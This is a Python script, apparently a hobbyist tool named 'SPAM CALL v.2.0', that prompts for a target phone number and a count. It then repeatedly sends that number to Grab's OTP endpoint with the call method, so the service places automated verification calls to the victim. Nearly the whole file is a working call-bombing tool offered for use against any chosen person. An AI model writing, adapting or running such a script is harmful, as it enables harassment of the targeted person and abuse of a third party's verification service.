#!/bin/usr/python

import os, requests, time

os.system('clear')
c=('\033[1;31m')
r=('\033[1;32m')
g=('\033[1;33m')
w=('\033[1;35m')

print ("""\033[1;35m

	   \033[1;35m \\\\\\\\/////
	    ---------	\033[1;33mSPAM CALL v.2.0
\033[1;35m	   / __    __\	\033[1;33mAuthor: TAUFIQ HAKIM
	   |  0\  /0 |	\033[1;33msIG    : tfqhkm._
	    \    |  /
	     \  __ /
	      -----
   \033[1;32mMASUKAN NOMOR DENGAN "601" (EX: 601XXXXXX)

""")

print (" ")
no1 = input("[+] NUMBER TARGET => %s"%(w))
jlmh=int(input("%s[+] SPAM AMOUNT => %s"%(g,w)))
dt1={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}

try:
	print()
	print("%s[!] RESULTS:%s"%(r,w))
	for i in range(jlmh):
		print("[!] PLEASE WAIT...")
		idk=("challengeID")
		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
		if str(idk) in str(r1.text):
			print("[+] SUCCESS")
		else:
			print("[-] FAIL")
		print("="*30)
		time.sleep(1)
except KeyboardInterrupt:
	print("%sSEE YOU AGAIN"%(c))
